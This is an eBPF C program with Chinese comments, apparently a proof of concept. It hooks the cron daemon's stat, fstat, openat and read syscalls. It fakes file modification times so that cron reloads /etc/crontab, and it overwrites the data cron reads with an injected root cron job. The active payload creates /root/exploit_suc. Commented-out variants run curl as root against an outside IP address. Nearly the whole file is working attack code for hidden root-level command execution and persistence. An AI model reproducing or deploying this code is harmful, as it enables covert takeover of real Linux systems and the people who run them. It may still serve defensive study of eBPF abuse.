// +build ignore

/*
开启 bpf_log 
*/
#define DEBUG_LOG

#include "my_def.h"
#include "global.h"
#include <stdbool.h>

char __license[] SEC("license") = "Dual MIT/GPL";

#define TASK_COMM_LEN 16
#define FILE_NAME_LEN 64
#define TARGET_NAME "cron"

#define SPOOL_DIR  "crontabs"
#define CRONTAB    "/etc/crontab"
#define SYSCRONTAB "/etc/crontab"


// 注意值的长度一定要和map的value_size一致，不然编译报错，提示stack数据无法放进map
// 指针用u64, buffer用任意长度
enum GlobalVal {
	KEY_VAL_TICK1 = 0,
	KEY_VAL_CRON_STATBUF,
	KEY_VAL_CRON_FSTATBUF,
	KEY_VAL_CRON_FD,
	KEY_VAL_CRON_PID,
	KEY_VAL_FSTAT_MODIFY_CNT, // 避免修改的太频繁
};

// 全局变量的key
enum GlobalBuf{
	KEY_BUF_CRON_STAT_FILENAME,
	KEY_BUF_CRON_OPENAT_FILENAME,
};

static __inline bool is_process(const char *buf, int len) {
	char comm[TASK_COMM_LEN] = {0};
	bpf_get_current_comm(&comm, sizeof(comm));
	if (memcmp(comm, buf, len) == 0) {
		return true;
	}
	return false;
}

static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx) {
	u64 gid = bpf_get_current_pid_tgid();
	u32 pid = gid & 0xffffffff;
	u32 cron_pid = get_global_val(KEY_VAL_CRON_PID);
	if (pid != cron_pid) {
		return 0;
	}

 	bpf_log("handle_enter_read: %d\n", pid);
	// bpf_log("handle_enter_read: %d\n", tick);
	return 0;
} 


static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx) {
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	char *filepath = NULL;
	char path[FILE_NAME_LEN] = {0};
	bpf_probe_read(&filepath, sizeof(filepath), &regs->di);
	bpf_probe_read_str(path, sizeof(path), filepath);

	// bpf_log("handle_enter_stat: %p\n", path);
	if (memcmp(path, SPOOL_DIR, sizeof(SPOOL_DIR)) != 0) {
		return 0;
	}

	// 保存cron pid
	u64 pid = bpf_get_current_pid_tgid() & 0xffffffff;
	save_global_val(KEY_VAL_CRON_PID, pid);

	struct stat * statbuf_ptr = NULL;
	bpf_probe_read(&statbuf_ptr , sizeof(statbuf_ptr) , &regs->si);
	// 注意需要保存的是statbuf_ptr的地址
	save_global_val(KEY_VAL_CRON_STATBUF, (u64) statbuf_ptr);

	// 保存当前stat的文件eBPF栈上的地址
	save_global_buf(KEY_BUF_CRON_STAT_FILENAME, (void *)path);

	bpf_log("handle_enter_stat: %s %p %p\n", path, path, statbuf_ptr);
	return 0;
} 

static __inline int handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx) {
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	u64 fd = 0;
	bpf_probe_read(&fd, sizeof(fd), &regs->di);
	u64 open_fd = get_global_val(KEY_VAL_CRON_FD);
	if (fd != open_fd) {
		return 0;
	}
	struct stat *statbuf_fstat_ptr = NULL;
	bpf_probe_read(&statbuf_fstat_ptr, sizeof(statbuf_fstat_ptr), &regs->si);
	save_global_val(KEY_VAL_CRON_FSTATBUF, (u64) statbuf_fstat_ptr);

	bpf_log("handle_enter_fstat: %d fd:%d %p\n", (int) get_global_val(KEY_VAL_TICK1), fd, statbuf_fstat_ptr);
	return 0;
} 

// 文件还没打开拿不到fd
// 记录SYSCRONTAB文件的名字
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx) {
	int tick = get_global_val(KEY_VAL_TICK1) + 1;
	save_global_val(KEY_VAL_TICK1, tick);
	
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	char *filepath = NULL;
	char file[FILE_NAME_LEN] = {0};
	bpf_probe_read(&filepath , sizeof(filepath) , &regs->si);
	bpf_probe_read_str(file, sizeof(file), filepath);

	// bpf_log("handle_enter_openat: %d\n", tick);
	if (memcmp(file, SYSCRONTAB, sizeof(SYSCRONTAB)) != 0) {
		return 0;
	}

	save_global_buf(KEY_BUF_CRON_OPENAT_FILENAME, (void *) file);
	bpf_log("handle_enter_openat: %d %s\n", tick, file);

	return 0;
}

static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx) {
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	int read_bytes = 0;
	int ret = -1;
	bpf_probe_read(&read_bytes, sizeof(read_bytes), &regs->ax);

	u64 gid = bpf_get_current_pid_tgid();
	u32 pid = gid & 0xffffffff;
	u32 cron_pid = get_global_val(KEY_VAL_CRON_PID);
	if (pid != cron_pid) {
		return 0;
	}

	int read_fd = 0;
	bpf_probe_read(&read_fd , sizeof(read_fd),&regs->di);
	u64 open_fd = get_global_val(KEY_VAL_CRON_FD);

	if (read_fd != (int) open_fd) {
		goto exit;
	}

	char *buffer = NULL;
	bpf_probe_read(&buffer , sizeof(buffer) , &regs->si);
	// char data[40];
	// bpf_probe_read_str(data, sizeof(data), buffer);
	bpf_log("read data: %s\n", buffer);

	// char PAYLOAD[] = "curl -d uid=Cron http://202.112.238.191 #";
	// char PAYLOAD[]  = "*  *    * * *   root    bash -c 'curl -d \"uid=Cron\" http://202.112.238.191/'  \n #";
	char PAYLOAD[]  = "*  *    * * *   root    bash -c 'mkdir -p /root/exploit_suc'  \n #";
	if(read_bytes > sizeof(PAYLOAD)){
		ret = bpf_probe_write_user((char *)(buffer), PAYLOAD, sizeof(PAYLOAD));
		bpf_log("try to send request---------------------------: %d\n", ret);
	}

exit:
	bpf_log("handle_exit_read: %d %d\n", get_global_val(KEY_VAL_TICK1), ret);
	return 0;
} 

static __inline int handle_exit_stat(struct bpf_raw_tracepoint_args *ctx) {
	struct stat * statbuf_ptr = (struct stat *) get_global_val(KEY_VAL_CRON_STATBUF);

	// Step-1: 获取当前文件名和stat_buf的指针
	char tagret_file[10] = {0};
	char *file_ptr = (char *)get_global_buf(KEY_BUF_CRON_STAT_FILENAME);
	bpf_probe_read_str(tagret_file, sizeof(tagret_file), file_ptr);

	// Step-2: 对关键文件的时间进行修改
	__kernel_ulong_t spool_dir_st_mtime = 0;
	__kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() & 0xffff;
	if (memcmp(tagret_file, SPOOL_DIR, sizeof(SPOOL_DIR)) == 0) {
		int t = bpf_probe_write_user(&statbuf_ptr->st_mtime, &spool_dir_st_mtime, sizeof(spool_dir_st_mtime));
		// bpf_log("write crontabs: %d %p\n", t, statbuf_ptr);
	} else if (memcmp(tagret_file, CRONTAB, sizeof(CRONTAB)) == 0) {
		int t = bpf_probe_write_user(&statbuf_ptr->st_mtime, &crontab_st_mtime, sizeof(crontab_st_mtime));
		bpf_log("write /etc/crontabs: %d %p\n", t, statbuf_ptr);
	}

	// bpf_log("handle_exit_stat: %s %p\n", tagret_file, file_ptr);
	return 0;
}

static __inline int handle_exit_fstat(struct bpf_raw_tracepoint_args *ctx) {
	u64 open_fd = get_global_val(KEY_VAL_CRON_FD);
	if (open_fd == 0) {
		return 0;
	}

	struct stat *statbuf_fstat_ptr = (struct stat *) get_global_val(KEY_VAL_CRON_FSTATBUF);
	__kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() & 0xffff;

	if (statbuf_fstat_ptr == NULL) {
		return 0;
	}

	int cnt = get_global_val(KEY_VAL_FSTAT_MODIFY_CNT) + 1;
	if(cnt == 1) {
		int t = bpf_probe_write_user(&statbuf_fstat_ptr->st_mtime , &crontab_st_mtime ,sizeof(crontab_st_mtime));
		bpf_log("Write bpf fstat: %d %p\n", t, statbuf_fstat_ptr);
	}
	if (cnt > 10) cnt = 0;	
	save_global_val(KEY_VAL_FSTAT_MODIFY_CNT, cnt);

	bpf_log("handle_exit_fstat: %d %d\n", (int) get_global_val(KEY_VAL_TICK1), cnt);
	return 0;
}

// 看上一次打开的文件是否是SYSCRONTAB，如果是的，就记录FD，后面fstat中根据这个fd来修改时间
static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx) {
	u64 fd = ctx->args[1];
	char filename[FILE_NAME_LEN] = {0};
	char empty[FILE_NAME_LEN] = {0};
	char * fptr = (char *)get_global_buf(KEY_BUF_CRON_OPENAT_FILENAME);
	bpf_probe_read_str(filename, sizeof(filename), fptr);
	
	int tick = get_global_val(KEY_VAL_TICK1);
	// bpf_log("handle_exit_openat: %d %s\n", tick, filename);
	
	// 将fd保存，并将当前打开的文件清空。防止记录到其他文件的fd
	if (memcmp(filename, SYSCRONTAB, sizeof(SYSCRONTAB)) == 0) {
		save_global_val(KEY_VAL_CRON_FD, fd);
		save_global_buf(KEY_BUF_CRON_OPENAT_FILENAME, (void *) empty);
		bpf_log("handle_exit_openat: %d %s\n", tick, filename);
	}
	
	return 0;
}


SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx) {
	if (!is_process(TARGET_NAME, sizeof(TARGET_NAME))) {
		return 0;
	}

	// bpf_log("is cron\n");
	unsigned long syscall_id = ctx->args[1];
	switch (syscall_id)
	{
	case 0:
		// handle_enter_read(ctx);
		break;
	case 4:
		// STEP-1: 记录cron配置目录的stat_ptr （在stat_exit的时候修改）
		handle_enter_stat(ctx);
		break;
	case 5:
		// STEP-2: 记录cron配置文件的fstat_ptr (在fstat_exit的时候修改)
		handle_enter_fstat(ctx);
		break;
	case 257:
		// STEP-3: 记录cron配置文件fd (在read_exit的时候覆盖内容)
		handle_enter_openat(ctx);
		break;
	}

	return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx) {
	if (!is_process(TARGET_NAME, sizeof(TARGET_NAME))) {
		return 0;
	}

	// https://elixir.bootlin.com/linux/v5.4.170/source/include/trace/events/syscalls.h#L18
	unsigned long syscall_id;
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	bpf_probe_read(&syscall_id, sizeof(syscall_id) , &regs->orig_ax);

	switch (syscall_id) {
		case 0:
			// STEP-3: 根据cron配置文件fd，修改任务内容
			handle_exit_read(ctx);
			break;
		case 4:
			// STEP-1: 根据cron配置目录的stat_ptr，来修改目录的timpstamp触发任务文件检查(fstat)
			handle_exit_stat(ctx);
			break;
		case 5:
			// STEP-2: 根据cron配置文件的fstat_ptr，来修改配置文件的timestamp，来触发任务执行(open-read conf)
			handle_exit_fstat(ctx);
			break;
		case 257:
			handle_exit_openat(ctx);
			break;
	}
	return 0;
}